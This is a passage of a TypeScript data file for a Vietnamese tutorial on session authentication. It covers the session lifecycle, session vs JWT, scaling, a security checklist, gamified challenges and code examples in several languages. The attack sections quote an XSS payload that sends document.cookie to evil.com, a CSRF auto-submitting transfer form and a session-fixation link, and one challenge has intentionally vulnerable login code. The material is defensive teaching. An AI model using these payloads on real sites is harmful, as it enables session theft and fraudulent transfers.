4. NẾU server KHÔNG regenerate session:
   → Bạn dùng session_HACKER_KNOWS
   → Hacker BIẾT session ID này
   → Hacker dùng session_HACKER_KNOWS để đăng nhập
   → Hacker vào được tài khoản của bạn!
\`\`\`

**Cách phòng chống**:
\`\`\`javascript
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // XÓA session cũ (nếu có)
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete(oldSessionId);
  }

  // TẠO SESSION MỚI (random mới hoàn toàn)
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 12*60*60*1000)
  });

  res.cookie('sessionId', newSessionId, { /* ... */ });

  res.json({ success: true });
});
\`\`\`

**Kết quả**:
- Hacker biết session cũ → Vô dụng (đã bị xóa)
- Bạn dùng session mới → Hacker KHÔNG biết
- Tài khoản an toàn ✓

---

#### 4. **Destruction (Hủy Session)**

**Khi nào**:
- User click "Logout"
- Session hết hạn (timeout)
- Admin force logout

**Điều gì xảy ra**:
\`\`\`javascript
app.post('/logout', async (req, res) => {
  const sessionId = req.cookies.sessionId;

  // 1. XÓA khỏi database
  await db.sessions.delete(sessionId);

  // 2. XÓA cookie khỏi browser
  res.clearCookie('sessionId');

  res.json({ success: true, message: 'Đã đăng xuất' });
});
\`\`\`

**LỖI THƯỜNG GẶP - Logout không hoàn toàn**:
\`\`\`javascript
// ❌ SAI - Chỉ xóa cookie, không xóa database
app.post('/logout', (req, res) => {
  res.clearCookie('sessionId');
  res.json({ success: true });
});

// Vấn đề: Session vẫn còn trong database
// Nếu hacker có session ID → Vẫn dùng được!
\`\`\`

**✅ ĐÚNG - Xóa cả 2 nơi**:
\`\`\`javascript
app.post('/logout', async (req, res) => {
  // 1. Xóa database
  await db.sessions.delete(req.cookies.sessionId);

  // 2. Xóa cookie
  res.clearCookie('sessionId');

  res.json({ success: true });
});
\`\`\`

### 📊 Timeline Ví Dụ

\`\`\`
7:00 AM  │ LOGIN → Creation
         │ Session: abc123, expires: 7:00 PM
         │
9:00 AM  │ Like ảnh → Refresh
         │ Session: abc123, expires: 9:00 PM (gia hạn)
         │
12:00 PM │ Comment → Refresh
         │ Session: abc123, expires: 12:00 AM
         │
3:00 PM  │ Đổi password → Regeneration
         │ Session CŨ: abc123 → XÓA
         │ Session MỚI: xyz789, expires: 3:00 AM
         │
10:00 PM │ LOGOUT → Destruction
         │ Session: xyz789 → XÓA
         │ Cookie → XÓA
         │ Phải đăng nhập lại
\`\`\`

### 🎯 Best Practices

**1. Luôn regenerate sau login**
\`\`\`javascript
// Sau khi verify credentials thành công
const newSessionId = crypto.randomBytes(32).toString('hex');
\`\`\`

**2. Sliding expiration cho UX tốt**
\`\`\`javascript
// Mỗi request → Gia hạn thêm 30 phút
session.expiresAt = new Date(Date.now() + 30*60*1000);
\`\`\`

**3. Logout phải xóa cả 2 nơi**
\`\`\`javascript
await db.sessions.delete(sessionId);  // Database
res.clearCookie('sessionId');         // Browser
\`\`\`

**4. Auto-cleanup sessions hết hạn**
\`\`\`javascript
// Chạy mỗi giờ
setInterval(async () => {
  await db.sessions.deleteMany({
    expiresAt: { $lt: new Date() }
  });
}, 60*60*1000);
\`\`\``,
      keyPoints: [
        'Creation: Tạo session mới khi đăng nhập - KHÔNG tái sử dụng ID cũ',
        'Refresh: Gia hạn session khi user active - Sliding expiration',
        'Regeneration: Tạo session mới sau đổi password/quyền - Chặn session fixation',
        'Destruction: Xóa CẢ database VÀ cookie khi logout',
        'Regeneration là bước BẮT BUỘC để chống session fixation attack'
      ],
      visual: 'Timeline: 7AM (Login) → 9AM (Refresh) → 3PM (Regenerate) → 10PM (Logout)',
      codeExamples: {
        javascript: `// Session Regeneration (prevents fixation attacks)
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // Invalidate old session if exists
  const oldSessionId = req.cookies.sessionId;
  if (oldSessionId) {
    await db.sessions.delete({ id: oldSessionId });
  }

  // Always generate NEW session ID after login
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000
  });

  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000
  });

  res.json({ success: true });
});`,
        python: `# Session Regeneration (prevents fixation attacks)
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)

    # Invalidate old session if exists
    old_session_id = request.cookies.get('sessionId')
    if old_session_id:
        db.sessions.delete(id=old_session_id)

    # Always generate NEW session ID after login
    new_session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': new_session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True})
    response.set_cookie('sessionId', new_session_id,
        httponly=True, secure=True, samesite='Strict', max_age=1800)

    return response`,
        csharp: `// Session Regeneration (prevents fixation attacks)
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);

    // Invalidate old session if exists
    if (Request.Cookies.TryGetValue("sessionId", out var oldSessionId))
    {
        var oldSession = await _db.Sessions.FindAsync(oldSessionId);
        if (oldSession != null) _db.Sessions.Remove(oldSession);
    }

    // Always generate NEW session ID after login
    var newSessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = newSessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", newSessionId, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true });
}`,
        ruby: `# Session Regeneration (prevents fixation attacks)
def login
  user = verify_credentials(params)

  # Invalidate old session if exists
  old_session_id = cookies[:sessionId]
  Session.find_by(id: old_session_id)&.destroy if old_session_id

  # Always generate NEW session ID after login
  new_session_id = SecureRandom.hex(32)

  Session.create!(
    id: new_session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: new_session_id,
    httponly: true,
    secure: true,
    same_site: :strict,
    expires: 30.minutes.from_now
  }

  render json: { success: true }
end`
      }
    },
    {
      id: 'section-6',
      category: 'concepts',
      title: 'Session vs JWT: Chọn Cái Nào?',
      icon: 'GitCompare',
      content: `### 🤔 Tình Huống: Website vs Mobile App

**Dự án 1: Admin Dashboard (Website)**
- Quản lý nhân sự, chỉ dùng trên browser
- Cần logout ngay khi rời công ty
- Bảo mật cao (dữ liệu nhạy cảm)
→ Dùng **SESSION**

**Dự án 2: App Giao Đồ Ăn (Mobile)**
- iOS/Android app
- Nhiều microservices (order, payment, delivery)
- Cần scale nhanh (hàng triệu users)
→ Dùng **JWT**

### ⚖️ So Sánh

| Tiêu Chí | Session | JWT |
|----------|---------|-----|
| **Lưu trữ** | Server (DB/Redis) | Client |
| **Logout** | Ngay lập tức ✓ | Đợi expire ⚠️ |
| **Mobile** | Cookie không tốt | Hoàn hảo ✓ |
| **Scale** | Cần Redis cluster | Dễ (stateless) ✓ |
| **Bảo mật** | Server kiểm soát ✓ | Client giữ token ⚠️ |

### ✅ Khi Nào Dùng Session?

1. **Website truyền thống**: Facebook web, Gmail web, Admin panel
2. **Cần logout ngay**: Ngân hàng, Healthcare
3. **Bảo mật ưu tiên**: Dữ liệu nhạy cảm
4. **Single app**: Không phải microservices

### ✅ Khi Nào Dùng JWT?

1. **Mobile app**: Shopee, Grab (cookie không hoạt động)
2. **Microservices**: Mỗi service verify độc lập
3. **API-first**: RESTful API, GraphQL
4. **Scale lớn**: Hàng triệu users, stateless

### 🔄 Hybrid (Kết Hợp)

**Facebook**:
- Web → Session
- Mobile → JWT
- API → OAuth

**Quyết định nhanh**:
- Mới học? → **Session** (đơn giản)
- Mobile app? → **JWT** (bắt buộc)
- Cần bảo mật cao? → **Session**
- Cần scale lớn? → **JWT**`,
      keyPoints: [
        'Session: Web app, logout ngay, bảo mật cao',
        'JWT: Mobile app, microservices, scale lớn',
        'Hybrid: Web dùng Session, Mobile dùng JWT',
        'Mới học → Session, Mobile → JWT',
        'Facebook, Google đều dùng cả hai'
      ],
      visual: 'Decision tree: Web vs Mobile → Session vs JWT',
    },

    // ADVANCED SECTIONS
    {
      id: 'section-7',
      category: 'security',
      title: 'Kịch Bản Tấn Công Thực Tế',
      icon: 'AlertTriangle',
      content: `### ⚠️ 3 Cuộc Tấn Công Phổ Biến Nhất

Đây KHÔNG phải lý thuyết. Đây là các cuộc tấn công xảy ra HÀNG NGÀY trên internet.

Các công ty mất hàng triệu đô vì developers:
- Quên set HttpOnly flag
- Không regenerate session sau login
- Logout không xóa session khỏi database

Hãy học các kịch bản này. Hiểu rõ cách tấn công. Biết cách phòng thủ.

---

### 🎯 Attack #1: Session Hijacking qua XSS

**Mục tiêu**: Đánh cắp session cookie

**Kịch bản**:

1. **Hacker inject script độc**:
   - Website có lỗ hổng XSS (không validate input)
   - Hacker post comment: \`<script>fetch('https://evil.com?c='+document.cookie)</script>\`

2. **Nạn nhân xem comment**:
   - Script chạy trong browser của nạn nhân
   - \`document.cookie\` đọc được session cookie
   - Gửi về server của hacker

3. **Hacker dùng cookie**:
   - Hacker set cookie vào browser của họ
   - Truy cập website
   - Server thấy cookie hợp lệ → Cho phép truy cập
   - Hacker đăng nhập thành công!

**Thiệt hại**:
- Hacker đọc tin nhắn riêng tư
- Hacker post bài, gửi tin nhắn giả mạo
- Hacker đổi password, chiếm tài khoản

**Phòng thủ**:
\`\`\`javascript
// ✅ Set HttpOnly flag
res.cookie('sessionId', sessionId, {
  httpOnly: true  // JavaScript KHÔNG đọc được!
});

// Kết quả:
// document.cookie → "" (rỗng)
// Hacker không lấy được cookie ✓
\`\`\`

**Thêm lớp bảo vệ**:
\`\`\`javascript
// Content Security Policy
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "script-src 'self'"  // Chỉ cho phép script từ domain này
  );
  next();
});
\`\`\`

---

### 🎯 Attack #2: Session Fixation

**Mục tiêu**: Cài session ID trước khi nạn nhân login

**Kịch bản**:

1. **Hacker tạo session**:
   - Hacker tạo session: \`HACKER_SESSION_123\`
   - Hacker biết ID này

2. **Hacker gửi link cho nạn nhân**:
   - Email: "Click để nhận quà: bank.com/login?sid=HACKER_SESSION_123"
   - Nạn nhân click link

3. **Nạn nhân đăng nhập**:
   - Nạn nhân nhập username + password
   - Server XÁC THỰC thành công
   - NẾU server KHÔNG regenerate session:
     → Server dùng \`HACKER_SESSION_123\` làm session

4. **Hacker chiếm tài khoản**:
   - Hacker dùng \`HACKER_SESSION_123\` (họ biết từ đầu)
   - Truy cập website
   - Đăng nhập thành công!

**Thiệt hại**:
- Hacker vào được tài khoản ngân hàng
- Chuyển tiền, đọc thông tin nhạy cảm

**Phòng thủ**:
\`\`\`javascript
// ✅ LUÔN LUÔN regenerate session sau login
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);

  // XÓA session cũ (nếu có)
  if (req.cookies.sessionId) {
    await db.sessions.delete(req.cookies.sessionId);
  }

  // TẠO SESSION MỚI (random hoàn toàn)
  const newSessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: newSessionId,
    userId: user.id
  });

  res.cookie('sessionId', newSessionId, { /* ... */ });
  res.json({ success: true });
});

// Kết quả:
// - Hacker biết HACKER_SESSION_123 → Đã bị xóa
// - User dùng session mới → Hacker KHÔNG biết ✓
\`\`\`

---

### 🎯 Attack #3: CSRF (Cross-Site Request Forgery)

**Mục tiêu**: Gửi request giả mạo kèm cookie của nạn nhân

**Kịch bản**:

1. **Nạn nhân đăng nhập ngân hàng**:
   - User login vào bank.com
   - Session cookie được lưu

2. **Hacker tạo website độc hại**:
   \`\`\`html
   <!-- evil.com -->
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="hacker_account" />
     <input name="amount" value="1000000" />
   </form>
   <script>
     document.forms[0].submit();  // Tự động submit
   </script>
   \`\`\`

3. **Nạn nhân truy cập evil.com**:
   - Click link lạ, vào evil.com
   - Form tự động submit đến bank.com
   - Browser TỰ ĐỘNG gửi cookie bank.com kèm theo

4. **Ngân hàng xử lý request**:
   - NẾU không có SameSite:
     → Cookie được gửi
     → Bank.com thấy session hợp lệ
     → Chuyển tiền thành công!

**Thiệt hại**:
- Mất tiền trong tài khoản
- Thay đổi thông tin cá nhân
- Post bài, gửi tin nhắn giả mạo

**Phòng thủ**:
\`\`\`javascript
// ✅ Set SameSite=Strict
res.cookie('sessionId', sessionId, {
  sameSite: 'strict'  // Cookie CHỈ gửi từ cùng domain
});

// Kết quả:
// - Request từ evil.com → Cookie KHÔNG được gửi
// - Request từ bank.com → Cookie được gửi ✓
\`\`\`

**Thêm CSRF token**:
\`\`\`javascript
// Generate CSRF token
app.get('/transfer-form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken;

  res.render('transfer', { csrfToken });
});

// Verify CSRF token
app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Process transfer...
});
\`\`\`

### 📊 Tóm Tắt

| Attack | Cách Tấn Công | Phòng Thủ |
|--------|---------------|----------|
| **XSS Hijacking** | Script đọc \`document.cookie\` | \`httpOnly: true\` |
| **Session Fixation** | Cài session ID trước login | Regenerate sau login |
| **CSRF** | Website khác gửi request | \`sameSite: 'strict'\` + CSRF token |

### ✅ Checklist Bảo Mật

\`\`\`javascript
// Code mẫu AN TOÀN
res.cookie('sessionId', sessionId, {
  httpOnly: true,        // ✅ Chặn XSS
  secure: true,          // ✅ Chỉ HTTPS
  sameSite: 'strict',    // ✅ Chặn CSRF
  maxAge: 30*60*1000     // ✅ Timeout 30 phút
});

// + Regenerate sau login  // ✅ Chặn Fixation
// + Logout xóa database   // ✅ Cleanup hoàn toàn
// + CSRF token cho forms  // ✅ Defense-in-depth
\`\`\``,
      keyPoints: [
        'XSS: Hacker cướp cookie bằng JavaScript → Dùng HttpOnly để chặn',
        'Session Fixation: Hacker cài ID trước → Dùng Regeneration để chặn',
        'CSRF: Hacker lừa browser gửi request → Dùng SameSite để chặn',
        'Luôn dùng HTTPS (Secure flag) để chống nghe lén',
        'Bảo mật là sự kết hợp nhiều lớp (Defense in Depth)'
      ],
      visual: 'Three security scenario cards (handled by SecurityScenario component)',
    },
    {
      id: 'section-8',
      category: 'advanced',
      title: 'Scaling: Khi Có 1 Triệu Users',
      icon: 'TrendingUp',
      content: `### 📈 Vấn Đề Của Session
Khi app của bạn phát triển từ 100 users lên 1 triệu users, session bắt đầu gặp vấn đề lớn:

**Kịch bản**:
- Bạn có 1 triệu users → Cần 50 servers chạy song song
- User A login vào Server 1 → Session lưu ở RAM Server 1
- User A gửi request tiếp theo → Load Balancer chuyển sang Server 2
- Server 2 kiểm tra RAM → Không thấy session đâu cả!
- User A bị logout ❌

### 🛠️ Giải Pháp Scaling

#### 1. Sticky Sessions (Dễ nhất)
Load Balancer nhớ: "User A luôn forward về Server 1".

- ✅ **Ưu điểm**: Dễ setup, không cần code thêm
- ❌ **Nhược điểm**: Server 1 quá tải thì User A chết chung. Không linh hoạt.

#### 2. Redis Cluster (Chuẩn mực)
Tất cả 50 servers đều kết nối vào một cụm server Redis chung.

- Server 1 tạo session → Lưu vào Redis
- Server 2 nhận request → Đọc từ Redis
- ✅ **Ưu điểm**: Nhanh, persistent, server nào chết cũng không sao
- ❌ **Nhược điểm**: Tốn tiền nuôi Redis cluster

#### 3. JWT (Stateless)
Bỏ session luôn! Dùng JWT để không cần lưu gì ở server.

- ✅ **Ưu điểm**: Scale vô cực, không tốn RAM/Redis
- ❌ **Nhược điểm**: Mất khả năng logout ngay lập tức

### 🏢 Thực Tế Các Ông Lớn Làm Gì?

- **Facebook/Netflix**: Dùng **Redis Cluster** khổng lồ để lưu sessions. Họ cần kiểm soát user (logout, block) nên chấp nhận tốn tiền.
- **Google/Shopee**: Dùng JWT cho mobile app, Session cho web.
- **Startup**: Bắt đầu với 1 database server (Postgres/MySQL) lưu session. Khi nào chậm thì chuyển sang Redis.

**Lời khuyên**:
Đừng lo về scaling khi mới có 100 users. Hãy dùng Database session. Khi nào có 10k users, chuyển sang Redis. Dễ mà!`,
      keyPoints: [
        'Vấn đề: Nhiều servers không share RAM với nhau',
        'Giải pháp 1: Sticky Session - User gắn chặt với 1 server',
        'Giải pháp 2: Redis Cluster - "Kho session" chung cho tất cả (Best choice)',
        'Giải pháp 3: JWT - Không lưu gì cả (Stateless)',
        'Đừng over-engineer: 10k users hãy nghĩ đến Redis'
      ],
      visual: 'Architecture diagram: Load Balancer → 3 Server → Common Redis',
    },
    {
      id: 'section-9',
      category: 'best_practices',
      title: 'Checklist Cho Developer Chuyên Nghiệp',
      icon: 'CheckCircle',
      content: `### 🛡️ Những Thứ Cần Làm NGAY HÔM NAY

Đừng chờ bị hack mới sửa. Hãy check lại code của bạn ngay bây giờ:

#### 1. Cấu hình Cookie
- [ ] **HttpOnly**: Bắt buộc (Chặn XSS)
- [ ] **Secure**: Bắt buộc (Chặn nghe lén, chỉ chạy HTTPS)
- [ ] **SameSite**: Strict hoặc Lax (Chặn CSRF)
- [ ] **MaxAge**: Đừng để quá dài (15-30p cho bank, 1 tuân cho Facebook)

#### 2. Logic Session
- [ ] **Regenerate ID**: Sau khi login phải tạo ID mới (Chống Fixation)
- [ ] **Logout**: Xóa cả DB lẫn Cookie (Chống dùng lại)
- [ ] **Random ID**: Dùng thư viện crypto, đừng dùng Math.random()

#### 3. UX (Trải nghiệm người dùng)
- [ ] **Sliding Expiration**: User đang dùng thì tự động gia hạn
- [ ] **Active Sessions**: Cho user xem danh sách thiết bị đang đăng nhập (như Facebook)
- [ ] **Force Logout**: Cho phép user đá thiết bị lạ ra ngoài

#### 4. Monitoring (Giám sát)
- [ ] **Log login**: Lưu lại ai đăng nhập, IP nào, giờ nào
- [ ] **Log failures**: Ai đăng nhập sai quá 5 lần? → Block IP
- [ ] **Alert**: Cảnh báo khi có hoạt động bất thường (Login từ nước lạ)

### 🎓 Lời Kết
Session Authentication là nền tảng của bảo mật web. Nó cũ nhưng không lỗi thời.
Hiểu sâu về nó, bạn sẽ tự tin xây dựng hệ thống an toàn cho hàng triệu người dùng.

Chúc bạn code an toàn! 🚀`,
      keyPoints: [
        'Cookie: HttpOnly + Secure + SameSite là bắt buộc',
        'Logic: Luôn regenerate ID sau khi login',
        'UX: Làm tính năng "Active Sessions" cho user quản lý',
        'Monitoring: Log mọi hành vi đăng nhập/đăng xuất',
        'Bảo mật là một quá trình, không phải tính năng'
      ],
      visual: 'Interactive Checklist UI with progress bar',
    }
  ],

  securityScenarios: [
    {
      id: 'scenario-1',
      name: 'Kẻ Cắp Cookie: XSS Attack',
      threatLevel: 'HIGH',
      attack: `Hacker chèn mã JavaScript độc hại vào web của bạn qua tính năng bình luận.
Script chạy: \`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`.
Nếu cookie KHÔNG có HttpOnly, hacker sẽ nhận được session ID ngay lập tức.`,
      exploitation: `Hacker giờ đã có session ID của bạn. Hắn set cookie vào browser của hắn và refresh trang.
Server thấy cookie hợp lệ → Hacker đăng nhập thành công vào tài khoản CỦA BẠN!`,
      defense: `BẬT HttpOnly=true cho cookies. Cờ này chặn JavaScript đọc cookie - document.cookie sẽ trả về rỗng.
XSS vẫn xảy ra, nhưng cookie an toàn. Ngoài ra, dùng Content Security Policy (CSP) để chặn script lạ.`,
      interactive: 'Thử đánh cắp cookie có và không có HttpOnly flag'
    },
    {
      id: 'scenario-2',
      name: 'Kẻ Cài Cắm: Session Fixation',
      threatLevel: 'MEDIUM',
      attack: `Hacker gửi link cho bạn: \`bank.com/login?sessionId=HACKER_CONTROLLED\`.
Bạn click và đăng nhập thành công. Server (code dở) chấp nhận session ID từ URL và dùng nó cho bạn.`,
      exploitation: `Hacker đã biết trước session ID (hắn tự tạo mà). Sau khi bạn đăng nhập, hắn dùng ID đó
để vào tài khoản của bạn. Bạn đã "mở cửa" mời hắn vào nhà.`,
      defense: `LUÔN LUÔN tạo session ID mới sau khi login. Không bao giờ chấp nhận ID từ client gửi lên.
Server phải tự tạo ID ngẫu nhiên. Bước đơn giản này chặn đứng Fixation attack.`,
      interactive: 'So sánh code: Bị lỗi vs An toàn'
    },
    {
      id: 'scenario-3',
      name: 'Quên Logout: Rủi Ro Máy Công Cộng',
      threatLevel: 'LOW',
      attack: `Bạn dùng máy ở thư viện, làm việc xong tắt tab (nhưng QUÊN click Logout).
Session cookie vẫn còn lưu trong browser.`,
      exploitation: `Người tiếp theo mở web lên. Browser tự động gửi cookie cũ của bạn.
Server thấy hợp lệ → Họ vào được tài khoản của bạn.`,
      defense: `Set thời gian hết hạn ngắn (15-30 phút). Dùng sliding expiration.
Có tính năng "Đăng xuất từ xa". Cảnh báo user khi dùng máy lại.`,
      interactive: 'Thử chỉnh timeout và xem session hết hạn'
    }
  ],

  challenges: [
    {
      id: 'challenge-1',
      name: 'Giải Mã Cookie',
      difficulty: 'EASY',
      description: `Bạn vừa bắt được một session cookie từ một website bảo mật kém.
Hãy xem cấu hình của nó và tìm ra các lỗ hổng. Thêm các cờ bảo mật còn thiếu để vá lỗi.`,
      startingCode: `// Cấu hình cookie hiện tại (LỖI)
res.cookie('sessionId', sessionId, {
  maxAge: 24 * 60 * 60 * 1000 // 24 giờ
});`,
      successCriteria: [
        'Thêm cờ httpOnly (Chống XSS)',
        'Thêm cờ secure (Chỉ HTTPS)',
        'Thêm sameSite=strict (Chống CSRF)',
        'Giảm maxAge xuống 30 phút (Hạn chế rủi ro)'
      ],
      badge: 'Security Initiate',
      reward: 'Huy hiệu Khiên Đồng + 10% progress'
    },
    {
      id: 'challenge-2',
      name: 'Xây Dựng Pháo Đài',
      difficulty: 'MEDIUM',
      description: `Hãy code một quy trình đăng nhập hoàn chỉnh. Yêu cầu:
Hash password, tạo session ID an toàn, lưu session và set cookie chuẩn bảo mật.`,
      startingCode: `// TODO: Hoàn thành API login này
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // TODO: Verify credentials
  // TODO: Generate secure session ID
  // TODO: Store session in database
  // TODO: Set secure cookie
  // TODO: Return success response
});`,
      successCriteria: [
        'Dùng bcrypt để verify password',
        'Tạo session ID ngẫu nhiên (32 bytes)',
        'Lưu session có thời hạn',
        'Set cookie với đủ 4 cờ bảo mật',
        'Xử lý lỗi đúng cách'
      ],
      badge: 'Auth Architect',
      reward: 'Huy hiệu Kiến Trúc Sư + 15% progress'
    },
    {
      id: 'challenge-3',
      name: 'Săn Lùng Hacker',
      difficulty: 'HARD',
      description: `Đoạn code này có 5 LỖI BẢO MẬT nghiêm trọng.
Hãy tìm và sửa tất cả. Từ XSS, Session Fixation đến Timing attacks.`,
      startingCode: `// CODE LỖI - Tìm và sửa 5 lỗi
app.post('/login', async (req, res) => {
  const { username, password, sessionId } = req.body;

  const user = await db.users.findOne({ username });
  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const session = sessionId || Math.random().toString();
  await db.sessions.create({ id: session, userId: user.id });

  res.cookie('sessionId', session);
  res.json({ success: true, user: user });
});`,
      successCriteria: [
        'Fix #1: Dùng bcrypt.compare (Chống lộ pass)',
        'Fix #2: KHÔNG nhận session ID từ client (Chống Fixation)',
        'Fix #3: Dùng crypto.randomBytes (Chống đoán ID)',
        'Fix #4: Thêm security flags cho cookie',
        'Fix #5: Không trả về user data nhạy cảm'
      ],
      badge: 'Security Guardian',
      reward: 'Huy hiệu Bảo Vệ + 25% progress'
    }
  ],

  achievements: {
    levels: [
      {
        id: 'protocol-initiate',
        name: 'Tân Binh Giao Thức',
        range: [0, 30],
        description: 'Bạn đã hiểu những kiến thức cơ bản về session authentication',
        icon: 'Shield',
        color: 'text-blue-400'
      },
      {
        id: 'security-operative',
        name: 'Chiến Binh Bảo Mật',
        range: [31, 60],
        description: 'Bạn có thể triển khai session auth an toàn ở môi trường production',
        icon: 'ShieldCheck',
        color: 'text-neon-400'
      },
      {
        id: 'elite-guardian',
        name: 'Hộ Vệ Tinh Nhuệ',
        range: [61, 90],
        description: 'Bạn đã làm chủ các kỹ thuật bảo mật nâng cao và scaling',
        icon: 'ShieldAlert',
        color: 'text-purple-400'
      },
      {
        id: 'master-architect',
        name: 'Đại Kiến Trúc Sư',
        range: [91, 100],
        description: 'Bạn đã oàn toàn làm chủ nghệ thuật session authentication',
        icon: 'Award',
        color: 'text-yellow-400'
      }
    ],
    calculateProgress: (completedSections: string[], completedChallenges: string[]) => {
      const sectionWeight = 70; // 70% of progress from sections
      const challengeWeight = 30; // 30% from challenges

      const sectionProgress = (completedSections.length / 9) * sectionWeight;
      const challengeProgress = (completedChallenges.length / 3) * challengeWeight;

      return Math.floor(sectionProgress + challengeProgress);
    },
    getLevel: (percentage: number) => {
      if (percentage >= 91) return 'master-architect';
      if (percentage >= 61) return 'elite-guardian';
      if (percentage >= 31) return 'security-operative';
      return 'protocol-initiate';
    }
  },

  crossReferences: {
    jwt: {
      title: 'Ready to Level Up? Learn JWT',
      description: `JWT (JSON Web Tokens) is the stateless alternative to sessions. Instead of storing
state on the server, all authentication data lives in the token itself. Perfect for mobile apps and
microservices where server-side sessions become a bottleneck.`,
      link: '/jwt/learn'
    },
    mfa: {
      title: 'Add Maximum Security with MFA',
      description: `Multi-Factor Authentication adds a second verification layer beyond passwords.
Even if session cookies are stolen, attackers can't access the account without the second factor.
Banking, healthcare, and admin panels require MFA for compliance.`,
      link: '/mfa/learn'
    },
    oauth: {
      title: 'Learn Delegation with OAuth 2.0',
      description: `OAuth lets users grant limited access without sharing passwords. "Login with Google"
uses OAuth - Google authenticates the user, your app receives an access token. Sessions can store
OAuth tokens for API calls.`,
      link: '/oauth/learn'
    }
  }
};

/**
 * Code Examples for Session Authentication
 * Organized by topic for easy component integration
 */
export const codeExamples = {
  settingCookie: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Express.js - Setting secure session cookie
app.post('/login', async (req, res) => {
  const user = await verifyCredentials(req.body);
  const sessionId = crypto.randomBytes(32).toString('hex');

  await db.sessions.create({
    id: sessionId,
    userId: user.id,
    expiresAt: Date.now() + 30 * 60 * 1000 // 30 minutes
  });

  res.cookie('sessionId', sessionId, {
    httpOnly: true,           // Prevents XSS
    secure: true,             // HTTPS only
    sameSite: 'strict',       // Prevents CSRF
    maxAge: 30 * 60 * 1000    // 30 minutes
  });

  res.json({ success: true, user: { id: user.id, email: user.email } });
});`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Flask - Setting secure session cookie
@app.route('/login', methods=['POST'])
def login():
    user = verify_credentials(request.json)
    session_id = secrets.token_hex(32)

    db.sessions.insert({
        'id': session_id,
        'user_id': user.id,
        'expires_at': datetime.now() + timedelta(minutes=30)
    })

    response = jsonify({'success': True, 'user': {'id': user.id, 'email': user.email}})
    response.set_cookie(
        'sessionId',
        session_id,
        httponly=True,        # Prevents XSS
        secure=True,          # HTTPS only
        samesite='Strict',    # Prevents CSRF
        max_age=1800          # 30 minutes
    )

    return response`
    },
    {
      language: 'csharp' as const,
      label: 'C#',
      code: `// ASP.NET Core - Setting secure session cookie
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    var user = await VerifyCredentials(request);
    var sessionId = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));

    await _db.Sessions.AddAsync(new Session
    {
        Id = sessionId,
        UserId = user.Id,
        ExpiresAt = DateTime.UtcNow.AddMinutes(30)
    });
    await _db.SaveChangesAsync();

    Response.Cookies.Append("sessionId", sessionId, new CookieOptions
    {
        HttpOnly = true,         // Prevents XSS
        Secure = true,           // HTTPS only
        SameSite = SameSiteMode.Strict,  // Prevents CSRF
        MaxAge = TimeSpan.FromMinutes(30)
    });

    return Ok(new { success = true, user = new { id = user.Id, email = user.Email } });
}`
    },
    {
      language: 'ruby' as const,
      label: 'Ruby',
      code: `# Rails - Setting secure session cookie
def login
  user = verify_credentials(params)
  session_id = SecureRandom.hex(32)

  Session.create!(
    id: session_id,
    user_id: user.id,
    expires_at: 30.minutes.from_now
  )

  cookies[:sessionId] = {
    value: session_id,
    httponly: true,      # Prevents XSS
    secure: true,        # HTTPS only
    same_site: :strict,  # Prevents CSRF
    expires: 30.minutes.from_now
  }

  render json: { success: true, user: { id: user.id, email: user.email } }
end`
    }
  ],

  validatingSession: [
    {
      language: 'javascript' as const,
      label: 'JavaScript',
      code: `// Express.js - Session validation middleware
async function validateSession(req, res, next) {
  const sessionId = req.cookies.sessionId;

  if (!sessionId) {
    return res.status(401).json({ error: 'No session cookie' });
  }

  const session = await db.sessions.findOne({ id: sessionId });

  if (!session) {
    return res.status(401).json({ error: 'Invalid session' });
  }

  if (session.expiresAt < Date.now()) {
    await db.sessions.delete({ id: sessionId });
    return res.status(401).json({ error: 'Session expired' });
  }

  // Update last activity (sliding expiration)
  await db.sessions.update(
    { id: sessionId },
    { lastActivity: Date.now() }
  );

  req.user = await db.users.findOne({ id: session.userId });
  next();
}`
    },
    {
      language: 'python' as const,
      label: 'Python',
      code: `# Flask - Session validation decorator
def validate_session(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        session_id = request.cookies.get('sessionId')

        if not session_id:
            return jsonify({'error': 'No session cookie'}), 401

        session = db.sessions.find_one(id=session_id)

        if not session:
            return jsonify({'error': 'Invalid session'}), 401

